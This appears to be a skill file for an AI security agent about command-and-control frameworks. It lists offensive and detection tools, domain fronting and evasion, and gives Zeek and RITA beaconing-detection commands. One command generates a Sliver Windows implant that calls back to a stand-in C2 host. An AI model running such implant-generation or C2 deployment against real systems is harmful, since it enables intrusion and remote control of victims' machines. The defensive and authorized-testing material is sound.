# C2 Frameworks

## When to Use

Activate when the operator asks about C2 framework deployment, implant generation,
C2 traffic detection, infrastructure setup, redirector configuration, beaconing
analysis, or adversary infrastructure hunting.

Mode: `[MODE: RED]` for C2 deployment and operations; `[MODE: BLUE]` for C2 detection and hunting; `[MODE: PURPLE]` for detection engineering.

## Prerequisites

- Tools: `cobalt-strike`, `sliver`, `havoc`, `mythic`, `wireshark`, `zeek`
- Dedicated infrastructure for C2 operations
- Authorization and signed Rules of Engagement (RoE)
- Operator certificates and authentication configured

## Quick Reference

| Technique | Primary Tools | CWE |
|-----------|--------------|-----|
| Cobalt Strike | Cobalt Strike, cs2modrewrite, Apache | CWE-300 |
| Sliver C2 | Sliver, sliver-client, cfssl | CWE-300 |
| Havoc framework | Havoc, havoc-client, golang | CWE-300 |
| DNS C2 | iodine, dnscat2, DNSStager | CWE-300 |
| Custom C2 | Python, Go, libsodium, protobuf | CWE-300 |
| Beaconing detection | RITA, Zeek, JA3, NetworkMiner | CWE-300 |
| Traffic analysis | Zeek, Wireshark, tshark, Arkime | CWE-300 |
| Redirectors | Apache, Nginx, socat, CloudFront | CWE-300 |
| Infrastructure hunting | JARM, Shodan, Censys, pDNS | CWE-300 |
| Mythic C2 | Mythic, Docker, mythic-cli | CWE-300 |
| Domain fronting | CloudFront, Azure CDN, Fastly | CWE-300 |
| C2 evasion | Malleable C2, JA3, traffic-shaper | CWE-300 |

## Workflow

### Step 1: Plan Infrastructure

```bash
# Generate Malleable C2 profile
# Configure redirectors and team server
# Set up DNS records and certificates
```

### Step 2: Deploy C2 Server

```bash
# Sliver example
sliver-server

# Generate implant
sliver > generate --mtls myc2.example.com --os windows --arch amd64 --save /tmp/implant.exe
```

### Step 3: Monitor and Detect

```bash
# Zeek connection logging
zeek -r capture.pcap
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p

# RITA beaconing analysis
rita import capture.pcap -d engagement
rita show-beacons engagement
```



## Verification

- [ ] All tools installed and operational
- [ ] Target acquired through authorized channels
- [ ] Analysis completed with findings documented
- [ ] Detection opportunities identified for blue team
- [ ] Artifacts preserved and report generated
